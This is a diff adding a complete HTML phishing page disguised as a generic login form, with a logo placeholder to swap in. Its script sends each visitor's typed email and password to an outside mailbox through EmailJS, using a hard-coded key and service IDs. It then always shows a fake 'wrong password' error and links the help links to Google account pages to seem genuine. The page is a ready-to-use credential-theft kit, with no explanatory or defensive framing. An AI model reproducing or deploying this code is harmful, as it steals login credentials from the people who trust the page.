@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in</title>
+
+<link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/lock--v1.png">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: Inter, "Segoe UI", sans-serif;
+  background: #f5f6ff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0 30px;
+}
+
+/* Top logo */
+.top-logo {
+  position: fixed;
+  top: -10px;
+  left: 15px;
+}
+.top-logo img {
+  height: 80px;
+}
+
+/* Loader */
+#page-loader {
+  position: fixed;
+  inset: 0;
+  background: #f5f6ff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+  transition: opacity .6s ease;
+}
+#page-loader.fade-out {
+  opacity: 0;
+  pointer-events: none;
+}
+.spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid #ddd;
+  border-top: 4px solid #6b4de6;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Card */
+.container {
+  width: 100%;
+  max-width: 360px;
+  background: #fff;
+  border-radius: 18px;
+  padding: 32px 26px;
+  box-shadow: 0 20px 40px rgba(0,0,0,.08);
+  border: 1px solid lightgrey;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: .7s ease;
+}
+.container.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+h2 {
+  margin: 0 0 24px;
+  text-align: center;
+  font-size: 24px;
+  font-weight: 700;
+  color: #2d2b55;
+}
+
+/* Divider */
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 18px;
+}
+.divider::before,
+.divider::after {
+  content: "";
+  flex: 1;
+  height: 1px;
+  background: #e6e6f2;
+}
+
+/* Labels & inputs */
+label {
+  font-size: 14px;
+  color: #7a7a8c;
+  display: block;
+  margin-bottom: 6px;
+}
+
+input {
+  width: 100%;
+  height: 46px;
+  border-radius: 10px;
+  border: 2px solid #e6e6f2;
+  padding: 0 14px;
+  font-size: 15px;
+  margin-bottom: 16px;
+}
+input:focus {
+  outline: none;
+  border-color: #6b4de6;
+}
+
+/* Password */
+.password-wrap {
+  position: relative;
+}
+.password-wrap span {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  opacity: .6;
+}
+
+/* Links */
+.links {
+  margin-bottom: 22px;
+}
+.links a {
+  font-size: 14px;
+  color: #6b4de6;
+  text-decoration: none;
+  font-weight: 500;
+}
+
+/* Button */
+button[type="submit"] {
+  width: 100%;
+  height: 52px;
+  border-radius: 12px;
+  border: none;
+  background: #6b4de6;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+/* Bottom text */
+.bottom-text {
+  text-align: center;
+  margin-top: 22px;
+  font-size: 14px;
+  color: #555;
+}
+.bottom-text a {
+  color: #6b4de6;
+  text-decoration: none;
+  font-weight: 600;
+}
+
+/* Error */
+.error-message {
+  display: none;
+  color: #e54848;
+  font-size: 13px;
+  margin-top: 12px;
+  text-align: center;
+}
+
+/* Loading overlay */
+.loading-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(255,255,255,.9);
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Logo -->
+<div class="top-logo">
+  <!-- replace src with your logo -->
+  <img src="https://zer0-0ne-zer0.github.io/0/hlogo.png" alt="Logo">
+</div>
+
+<div id="page-loader">
+  <div class="spinner"></div>
+</div>
+
+<div class="container" id="main-container">
+ 
+
+  <form id="login-form">
+    <label>Email address</label>
+    <input type="email" id="email" required>
+
+    <label>Password</label>
+    <div class="password-wrap">
+      <input type="password" id="password" required>
+      <span></span>
+    </div>
+
+    <div class="links">
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <button type="submit">Log in</button>
+    <div class="error-message" id="error-msg">Wrong email or password</div>
+  </form>
+
+  <div class="bottom-text">
+    Don't have an account? <a href="#">Sign Up</a>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loading-screen">
+  <div class="spinner"></div>
+  <div>Signing in...</div>
+</div>
+
+<!-- 🔒 JS — NOT TOUCHED -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+emailjs.init("Zuxy6x2TZlxuZ4ABj");
+
+document.addEventListener("DOMContentLoaded", () => {
+  const pageLoader = document.getElementById("page-loader");
+  const container = document.getElementById("main-container");
+
+  setTimeout(() => {
+    pageLoader.classList.add("fade-out");
+    container.classList.add("visible");
+  }, 1500);
+
+  const form = document.getElementById("login-form");
+  const loader = document.getElementById("loading-screen");
+  const errorMsg = document.getElementById("error-msg");
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+    loader.style.display = "flex";
+
+    emailjs.send("service_z1uzh6f", "template_whed5zh", {
+      email: document.getElementById("email").value,
+      password: document.getElementById("password").value
+    }).then(() => {
+      loader.style.display = "none";
+      errorMsg.style.display = "block";
+    });
+  });
+
+  document.querySelectorAll("a").forEach(link => {
+    const text = link.textContent.toLowerCase();
+    if (text.includes("sign up")) {
+      link.href = "https://accounts.google.com/signup";
+    } else if (text.includes("forgot")) {
+      link.href = "https://accounts.google.com/signin/v2/usernamerecovery";
+    }
+  });
+});
+</script>
+
+</body>
+</html>
